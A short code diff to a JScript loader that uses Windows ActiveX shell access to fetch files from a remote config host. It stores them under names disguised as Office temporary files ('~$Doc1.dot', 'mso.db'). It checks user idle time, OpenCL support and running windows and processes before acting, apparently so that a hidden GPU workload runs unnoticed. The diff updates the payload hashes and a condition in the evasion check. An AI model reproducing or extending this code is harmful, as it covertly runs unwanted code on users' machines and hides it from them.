@@ -20,7 +20,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReadys ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"AA44DF45A7331CB4C1165F05E28D57ED" }
+var __destReadys ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"A8B536DE59C8BE867B72E41C6C3E7130" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -34,7 +34,7 @@ if(__DEBUG)
 	var __idletime=1000*15
 else if(__IsSupportOpencl)
 	var __idletime=1000*30
-var __destReadys_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"FB146F1CB4C46F06D77558D37D7DDA13" }
+var __destReadys_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"FF3B7C585CEC08D8B6E11EC43058A90A" }
 var __installReadys = { name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", md5:"8867658a8edd9765342bfc2483ed8c3e"}
 ///////////
 trace ("global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+",__startTickCout="+__startTickCout+",__lastInputInfo="+__lastInputInfo)
@@ -360,7 +360,7 @@ function filter_eXclusiveRuning.prototype.run(pipe){
 		return true;
 	}else{
 		setInterval(function (){
-			var ret = pThis.checkWindows() && pThis.checkProcesses() && external.__debugging; 
+			var ret = external.__debugging && pThis.checkWindows() && pThis.checkProcesses() ; 
 			if(ret)
 			{
 				pipe.exitaction=unescape(ret.toString());
